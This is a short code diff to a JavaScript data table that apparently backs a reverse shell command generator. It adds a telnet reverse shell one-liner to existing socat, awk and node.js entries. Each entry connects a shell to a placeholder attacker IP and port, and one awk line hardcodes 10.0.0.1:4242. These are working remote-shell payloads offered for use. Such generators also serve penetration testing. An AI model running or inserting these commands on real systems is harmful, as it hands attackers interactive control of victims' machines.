@@ -39,7 +39,8 @@ const rsgData = {
         ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
         ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
         ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
-        ['node.js', 'require(\'child_process\').exec(\'nc -e /bin/{shell} {ip} {port}\')']
+        ['node.js', 'require(\'child_process\').exec(\'nc -e /bin/{shell} {ip} {port}\')'],
+        ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF']
         
     ],
 
